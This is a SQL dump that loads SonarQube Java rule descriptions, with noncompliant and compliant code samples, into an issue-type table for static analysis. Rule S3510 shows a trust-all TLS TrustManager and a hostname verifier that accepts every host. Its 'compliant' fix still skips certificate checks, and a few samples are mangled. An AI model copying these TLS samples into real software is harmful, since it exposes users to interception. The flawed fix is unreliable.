  <li> <a href="https://maven.apache.org/developers/conventions/code.html#POM_Code_Convention">POM Code Convention</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3436', 'Value-based classes should not be used for locking', 'sonarqube', 'Bug', '<p>According to the documentation,</p>
<blockquote>
  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly
  via reference equality or indirectly via an appeal to synchronization...
</blockquote>
<p>This is because value-based classes are intended to be wrappers for value types, which will be primitive-like collections of data (similar to
<code>struct</code>s in other languages) that will come in future versions of Java.</p>
<blockquote>
  <p>Instances of a value-based class ... </p>
  <ul>
    <li> do not have accessible constructors, but are instead instantiated through factory methods which make no commitment as to the identity of
    returned instances; </li>
  </ul>
</blockquote>
<p>This means that you can''t be sure you''re the only one trying to lock on any given instance of a value-based class, opening your code up to
contention and deadlock issues.</p>
<p>Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of the behavior beyond that.</p>
<p>This rule raises an issue when a known value-based class is used for synchronization. That includes all the classes in the <code>java.time</code>
package except <code>Clock</code>; the date classes for alternate calendars, <code>HijrahDate</code>, <code>JapaneseDate</code>,
<code>MinguoDate</code>, <code>ThaiBuddhistDate</code>; and the optional classes: <code>Optional</code>, <code>OptionalDouble</code>,
<code>OptionalLong</code>, <code>OptionalInt</code>.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Optional&lt;Foo&gt; fOpt = doSomething();
synchronized (fOpt) {  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html">Value-based classes</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3437', 'Value-based objects should not be serialized', 'sonarqube', 'Code Smell', '<p>According to the documentation,</p>
<blockquote>
  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly
  via reference equality or indirectly via an appeal to synchronization, identity hashing, serialization...
</blockquote>
<p>For example (credit to Brian Goetz), imagine Foo is a value-based class:</p>
<pre>
Foo[] arr = new Foo[2];
arr[0] = new Foo(0);
arr[1] = new Foo(0);
</pre>
<p>Serialization promises that on deserialization of arr, elements 0 and 1 will not be aliased. Similarly, in:</p>
<pre>
Foo[] arr = new Foo[2];
arr[0] = new Foo(0);
arr[1] = arr[0];
</pre>
<p>Serialization promises that on deserialization of <code>arr</code>, elements 0 and 1 <strong>will</strong> be aliased.</p>
<p>While these promises are coincidentally fulfilled in current implementations of Java, that is not guaranteed in the future, particularly when true
value types are introduced in the language.</p>
<p>This rule raises an issue when a <code>Serializable</code> class defines a non-transient, non-static field field whose type is a known serializable
value-based class. Known serializable value-based classes are: all the classes in the <code>java.time</code> package except <code>Clock</code>; the
date classes for alternate calendars: <code>HijrahDate</code>, <code>JapaneseDate</code>, <code>MinguoDate</code>, <code>ThaiBuddhistDate</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass implements Serializable {
  private HijrahDate date;  // Noncompliant; mark this transient
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass implements Serializable {
  private transient HijrahDate date;
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html">Value-based classes</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3438', '"SingleConnectionFactory" instances should be set to "reconnectOnException"', 'sonarqube', 'Bug', '<p>Use of a Spring <code>SingleConnectionFactory</code> without enabling the <code>reconnectOnException</code> setting will prevent automatic
connection recovery when the connection goes bad. </p>
<p>That''s because the <code>reconnectOnException</code> property defaults to <code>false</code>. As a result, even if the code that uses this
connection factory (Spring''s <code>DefaultMessageListenerContainer</code> or your own code) has reconnect logic, that code won''t work because the
<code>SingleConnectionFactory</code> will act like a single-connection pool by preventing connection <code>close</code> calls from actually closing
anything. As a result, subsequent factory <code>create</code> operations will just hand back the original broken <code>Connection</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;  &lt;!-- Noncompliant --&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
 &lt;/bean&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory" p:reconnectOnException="true"&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
 &lt;/bean&gt;
</pre>
<p>or</p>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
   &lt;property name="reconnectOnException"&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;
 &lt;/bean&gt;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3439', '"DefaultMessageListenerContainer" instances should not drop messages during restarts', 'sonarqube', 'Bug', '<p><code>DefaultMessageListenerContainer</code> is implemented as a JMS poller. While the Spring container is shutting itself down, as each
in-progress JMS <code>Consumer.receive()</code> call completes, any non-<code>null</code> return value will be a JMS message that the DMLC will
<em>discard</em> due to the shutdown in progress. That will result in the received message never being processed. </p>
<p>To prevent message loss during restart operations, set <code>acceptMessagesWhileStopping</code> to <code>true</code> so that such messages will be
processed before shut down.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;bean id="listenerContainer" class="org.springframework.jms.listener.DefaultMessageListenerContainer"&gt;  &lt;!-- Noncompliant --&gt;
   &lt;property name="connectionFactory" ref="connFactory" /&gt;
   &lt;property name="destination" ref="dest" /&gt;
   &lt;property name="messageListener" ref="serviceAdapter" /&gt;
   &lt;property name="autoStartup" value="true" /&gt;
   &lt;property name="concurrentConsumers" value="10" /&gt;
   &lt;property name="maxConcurrentConsumers" value="10" /&gt;
   &lt;property name="clientId" value="myClientID" /&gt;
&lt;/bean&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;bean id="listenerContainer" class="org.springframework.jms.listener.DefaultMessageListenerContainer"&gt;
   &lt;property name="connectionFactory" ref="connFactory" /&gt;
   &lt;property name="destination" ref="dest" /&gt;
   &lt;property name="messageListener" ref="serviceAdapter" /&gt;
   &lt;property name="autoStartup" value="true" /&gt;
   &lt;property name="concurrentConsumers" value="10" /&gt;
   &lt;property name="maxConcurrentConsumers" value="10" /&gt;
   &lt;property name="clientId" value="myClientID" /&gt;
   &lt;property name="acceptMessagesWhileStopping" value="true" /&gt;
&lt;/bean&gt;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3457', 'Printf-style format strings should be used correctly', 'sonarqube', 'Code Smell', '<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that
result in the wrong strings being created. This rule statically validates the correlation of <code>printf</code>-style format strings to their
arguments when calling the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>,
<code>java.io.PrintStream</code>, <code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of
<code>java.io.PrintStream</code> or <code>java.io.PrintWriter</code> classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
String.format("First {0} and then {1}", "foo", "bar");  //Noncompliant. Looks like there is a confusion with the use of {{java.text.MessageFormat}}, parameters "foo" and "bar" will be simply ignored here
String.format("Display %3$d and then %d", 1, 2, 3);   //Noncompliant; the second argument ''2'' is unused
String.format("Too many arguments %d and %d", 1, 2, 3);  //Noncompliant; the third argument ''3'' is unused
String.format("First Line
");   //Noncompliant; %n should be used in place of
 to produce the platform-specific line separator
String.format("Is myObject null ? %b", myObject);   //Noncompliant; when a non-boolean argument is formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is misleading. It''s better to directly inject the boolean value (myObject == null in this case)
String.format("value is " + value); // Noncompliant
String s = String.format("string without arguments"); // Noncompliant

MessageFormat.format("Result ''{0}''.", value); // Noncompliant; String contains no format specifiers. (quote are discarding format specifiers)
MessageFormat.format("Result {0}.", value, value);  // Noncompliant; 2nd argument is not used
MessageFormat.format("Result {0}.", myObject.toString()); // Noncompliant; no need to call toString() on objects

java.util.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {0}.", myObject.toString()); // Noncompliant; no need to call toString() on objects
logger.log(java.util.logging.Level.SEVERE, "Result.", new Exception()); // compliant, parameter is an exception
logger.log(java.util.logging.Level.SEVERE, "Result ''{0}''", 14); // Noncompliant - String contains no format specifiers.
logger.log(java.util.logging.Level.SEVERE, "Result " + param, exception); // Noncompliant; Lambda should be used to differ string concatenation.

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}");
slf4jLog.debug(marker, "message", 1); // Noncompliant - String contains no format specifiers.

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message", 1); // Noncompliant - String contains no format specifiers.
</pre>
<h2>Compliant Solution</h2>
<pre>
String.format("First %s and then %s", "foo", "bar");
String.format("Display %2$d and then %d", 1, 3);
String.format("Too many arguments %d %d", 1, 2);
String.format("First Line%n");
String.format("Is myObject null ? %b", myObject == null);
String.format("value is %d", value);
String s = "string without arguments";

MessageFormat.format("Result {0}.", value);
MessageFormat.format("Result ''{0}''  =  {0}", value);
MessageFormat.format("Result {0}.", myObject);

java.util.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {0}.", myObject);
logger.log(java.util.logging.Level.SEVERE, "Result {0}''", 14);
logger.log(java.util.logging.Level.SEVERE, exception, () -&gt; "Result " + param);

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}");
slf4jLog.debug(marker, "message {}", 1);

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message {}", 1);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/J9YxBQ">CERT, FIO47-C.</a> - Use valid format strings </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3510', '"HostnameVerifier.verify" should not always return true', 'sonarqube', 'Vulnerability', '<p>To prevent URL spoofing, <code>HostnameVerifier.verify()</code> methods should do more than simply <code>return true</code>. Doing so may get you
quickly past an exception, but that comes at the cost of opening a security hole in your application. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SSLContext sslcontext = SSLContext.getInstance( "TLS" );
sslcontext.init(null, new TrustManager[]{new X509TrustManager() {
  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }

}}, new java.security.SecureRandom());

Client client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {
  @Override
  public boolean verify(String requestedHost, SSLSession remoteServerSession) {
    return true;  // Noncompliant
  }
}).build();
</pre>
<h2>Compliant Solution</h2>
<pre>
SSLContext sslcontext = SSLContext.getInstance( "TLSv1.2" );
sslcontext.init(null, new TrustManager[]{new X509TrustManager() {
  @Override
  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  @Override
  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  @Override
  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }

}}, new java.security.SecureRandom());

Client client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {
  @Override
  public boolean verify(String requestedHost, SSLSession remoteServerSession) {
    return requestedHost.equalsIgnoreCase(remoteServerSession.getPeerHost()); // Compliant
  }
}).build();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER">WEAK_HOSTNAME_VERIFIER</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5527''>S5527</a> instead.</p>', 'java', 'DEPRECATED', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3516', 'Methods returns should not be invariant', 'sonarqube', 'Code Smell', '<p>When a method is designed to return an invariant value, it may be poor design, but it shouldn''t adversely affect the outcome of your program.
However, when it happens on all paths through the logic, it is surely a bug.</p>
<p>This rule raises an issue when a method contains several <code>return</code> statements that all return the same value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int foo(int a) {
  int b = 12;
  if (a == 1) {
    return b;
  }
  return b;  // Noncompliant
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3518', 'Zero should not be a possible denominator', 'sonarqube', 'Bug', '<p>If the denominator to a division or modulo operation is zero it would result in a fatal error.</p>
<p>When working with <code>double</code> or <code>float</code>, no fatal error will be raised, but it will lead to unusual result and should be
avoided anyway.</p>
<p>This rule supports primitive <code>int</code>, <code>long</code>, <code>double</code>, <code>float</code> as well as <code>BigDecimal</code> and
<code>BigInteger</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void test_divide() {
  int z = 0;
  if (unknown()) {
    // ..
    z = 3;
  } else {
    // ..
  }
  z = 1 / z; // Noncompliant, possible division by zero
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void test_divide() {
  int z = 0;
  if (unknown()) {
    // ..
    z = 3;
  } else {
    // ..
    z = 1;
  }
  z = 1 / z;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/369.html">MITRE, CWE-369</a> - Divide by zero </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/CTZGBQ">CERT, NUM02-J.</a> - Ensure that division and remainder operations do not result in
  divide-by-zero errors </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ftYxBQ">CERT, INT33-C.</a> - Ensure that division and remainder operations do not result in
  divide-by-zero errors </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3551', 'Overrides should match their parent class methods in synchronization', 'sonarqube', 'Bug', '<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper
synchronization as callers rely on the thread-safety promised by the parent class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

 @Override
  public void foo () {  // Noncompliant
    // ...
    super.foo();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

  @Override
  synchronized void foo () {
    // ...
    super.foo();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/gzdGBQ">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are not
  thread-safe </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3553', '"Optional" should not be used for parameters', 'sonarqube', 'Code Smell', '<p>The Java language authors have been quite frank that <code>Optional</code> was intended for use only as a return type, as a way to convey that a
method may or may not return a value. </p>
<p>And for that, it''s valuable but using <code>Optional</code> on the input side increases the work you have to do in the method without really
increasing the value. With an <code>Optional</code> parameter, you go from having 2 possible inputs: null and not-null, to three: null,
non-null-without-value, and non-null-with-value. Add to that the fact that overloading has long been available to convey that some parameters are
optional, and there''s really no reason to have <code>Optional</code> parameters.</p>
<p>The rule also checks for Guava''s <code>Optional</code>, as it was the inspiration for the JDK <code>Optional</code>. Although it is different in
some aspects (serialization, being recommended for use as collection elements), using it as a parameter type causes exactly the same problems as for
JDK <code>Optional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String sayHello(Optional&lt;String&gt; name) {  // Noncompliant
  if (name == null || !name.isPresent()) {
    return "Hello World";
  } else {
    return "Hello " + name;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String sayHello(String name) {
  if (name == null) {
    return "Hello World";
  } else {
    return "Hello " + name;
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3577', 'Test classes should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test class name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$</code></p>
<pre>
class Foo {  // Noncompliant
  @Test
  void check() {  }
}

class Bar {  // Noncompliant
  @Nested
  class PositiveCase {
    @Test
    void check() {  }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooTest {
  @Test
  void check() {  }
}

class BarIT {
  @Nested
  class PositiveCase {
    @Test
    void check() {  }
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3578', 'Test methods should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>
<pre>
@Test
public void foo() {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testFoo() {
  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3599', 'Double Brace Initialization should not be used', 'sonarqube', 'Bug', '<p>Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the instance of the owning object, its use can lead to
memory leaks if the anonymous inner class is returned and held by other objects. Even when there''s no leak, DBI is so obscure that it''s bound to
confuse most maintainers. </p>
<p>For collections, use <code>Arrays.asList</code> instead, or explicitly add each item directly to the collection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Map source = new HashMap(){{ // Noncompliant
    put("firstName", "John");
    put("lastName", "Smith");
}};
</pre>
<h2>Compliant Solution</h2>
<pre>
Map source = new HashMap();
// ...
source.put("firstName", "John");
source.put("lastName", "Smith");
// ...
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3626', 'Jump statements should not be redundant', 'sonarqube', 'Code Smell', '<p>Jump statements such as <code>return</code> and <code>continue</code> let you change the default flow of program execution, but jump statements
that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void foo() {
  while (condition1) {
    if (condition2) {
      continue; // Noncompliant
    } else {
      doTheThing();
    }
  }
  return; // Noncompliant; this is a void method
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void foo() {
  while (condition1) {
    if (!condition2) {
      doTheThing();
    }
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3631', '"Arrays.stream" should be used for primitive arrays', 'sonarqube', 'Code Smell', '<p>For arrays of objects, <code>Arrays.asList(T ... a).stream()</code> and <code>Arrays.stream(array)</code> are basically equivalent in terms of
performance. However, for arrays of primitives, using <code>Arrays.asList</code> will force the construction of a list of boxed types, and then use
<em>that</em> list as a stream. On the other hand, <code>Arrays.stream</code> uses the appropriate primitive stream type (<code>IntStream</code>,
<code>LongStream</code>, <code>DoubleStream</code>) when applicable, with much better performance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Arrays.asList("a1", "a2", "b1", "c2", "c1").stream()
    .filter(...)
    .forEach(...);

Arrays.asList(1, 2, 3, 4).stream() // Noncompliant
    .filter(...)
    .forEach(...);
</pre>
<h2>Compliant Solution</h2>
<pre>
Arrays.asList("a1", "a2", "b1", "c2", "c1").stream()
    .filter(...)
    .forEach(...);

int[] intArray = new int[]{1, 2, 3, 4};
Arrays.stream(intArray)
    .filter(...)
    .forEach(...);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3655', 'Optional value should only be accessed after calling isPresent()', 'sonarqube', 'Bug', '<p><code>Optional</code> value can hold either a value or not. The value held in the <code>Optional</code> can be accessed using the
<code>get()</code> method, but it will throw a </p>
<p><code>NoSuchElementException</code> if there is no value present. To avoid the exception, calling the <code>isPresent()</code> or <code>!
isEmpty()</code> method should always be done before any call to <code>get()</code>.</p>
<p>Alternatively, note that other methods such as <code>orElse(...)</code>, <code>orElseGet(...)</code> or <code>orElseThrow(...)</code> can be used
to specify what to do with an empty <code>Optional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

String stringValue = value.get(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

if (value.isPresent()) {
  String stringValue = value.get();
}
</pre>
<p>or</p>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

String stringValue = value.orElse("default");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3658', 'Unit tests should throw exceptions', 'sonarqube', 'Code Smell', '<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a
<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>
<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>
<p>Supported frameworks:</p>
<ul>
  <li> JUnit3 </li>
  <li> JUnit4 </li>
  <li> JUnit5 </li>
  <li> Fest assert </li>
  <li> AssertJ </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testMethod() {
  try {
            // Some code
  } catch (MyException e) {
    Assert.fail(e.getMessage());  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testMethod() throws MyException {
    // Some code
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3725', 'Java 8''s "Files.exists" should not be used', 'sonarqube', 'Code Smell', '<p>The <code>Files.exists</code> method has noticeably poor performance in JDK 8, and can slow an application significantly when used to check files
that don''t actually exist. </p>
<p>The same goes for <code>Files.notExists</code>, <code>Files.isDirectory</code> and <code>Files.isRegularFile</code> from <code>java.nio.file</code>
package.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is not 8.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Path myPath;
if(java.nio.file.Files.exists(myPath)) {  // Noncompliant
 // do something
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Path myPath;
if(myPath.toFile().exists())) {
 // do something
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://bugs.openjdk.java.net/browse/JDK-8153414">https://bugs.openjdk.java.net/browse/JDK-8153414</a> </li>
  <li> <a href="https://bugs.openjdk.java.net/browse/JDK-8154077">https://bugs.openjdk.java.net/browse/JDK-8154077</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3740', 'Raw types should not be used', 'sonarqube', 'Code Smell', '<p>Generic types shouldn''t be used raw (without type parameters) in variable declarations or return values. Doing so bypasses generic type checking,
and defers the catch of unsafe code to runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List myList; // Noncompliant
Set mySet; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; myList;
Set&lt;? extends Number&gt; mySet;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3749', 'Members of Spring components should be injected', 'sonarqube', 'Vulnerability', '<p>Spring <code>@Component</code>, <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default,
meaning only one instance of the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members,
such as a logger, but all non-<code>static</code> members should be managed by Spring. That is, they should have one of these annotations:
<code>@Resource</code>, <code>@Inject</code>, <code>@Autowired</code> or <code>@Value</code>.</p>
<p>Having non-injected members in one of these classes could indicate an attempt to manage state. Because they are singletons, such an attempt is
almost guaranteed to eventually expose data from User1''s session to User2. </p>
<p>This rule raises an issue when a singleton <code>@Component</code>, <code>@Controller</code>, <code>@Service</code>, or <code>@Repository</code>,
not annotated with <code>@ConfigurationProperties</code>, has non-<code>static</code> members that are not annotated with one of:</p>
<ul>
  <li> <code>org.springframework.beans.factory.annotation.Autowired</code> </li>
  <li> <code>org.springframework.beans.factory.annotation.Value</code> </li>
  <li> <code>javax.annotation.Inject</code> </li>
  <li> <code>javax.annotation.Resource</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
public class HelloWorld {

  private String name = null;

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    if (greetee != null) {
      this.name = greetee;
    }

    return "Hello " + this.name;  // if greetee is null, you see the previous user''s data
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3750', 'Spring "@Controller" classes should not use "@Scope"', 'sonarqube', 'Bug', '<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s have <code>singleton</code> scope by default, meaning only
one instance of the class is ever instantiated in the application. Defining any other scope for one of these class types will result in needless churn
as new instances are created and destroyed. In a busy web application, this could cause a significant amount of needless additional load on the
server.</p>
<p>This rule raises an issue when the <code>@Scope</code> annotation is applied to a <code>@Controller</code>, <code>@Service</code>, or
<code>@Repository</code> with any value but "singleton". <code>@Scope("singleton")</code> is redundant, but ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Scope("prototype")  // Noncompliant
@Controller
public class HelloWorld {
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
public class HelloWorld {
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3751', '"@RequestMapping" methods should be "public"', 'sonarqube', 'Code Smell', '<p>A method with a <code>@RequestMapping</code> annotation part of a class annotated with <code>@Controller</code> (directly or indirectly through a
meta annotation - <code>@RestController</code> from Spring Boot is a good example) will be called to handle matching web requests. That will happen
even if the method is <code>private</code>, because Spring invokes such methods via reflection, without checking visibility. </p>
<p>So marking a sensitive method <code>private</code> may seem like a good way to control how such code is called. Unfortunately, not all Spring
frameworks ignore visibility in this way. For instance, if you''ve tried to control web access to your sensitive, <code>private</code>,
<code>@RequestMapping</code> method by marking it <code>@Secured</code> ... it will still be called, whether or not the user is authorized to access
it. That''s because AOP proxies are not applied to non-public methods.</p>
<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,
<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@RequestMapping("/greet", method = GET)
private String greet(String greetee) {  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@RequestMapping("/greet", method = GET)
public String greet(String greetee) {
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
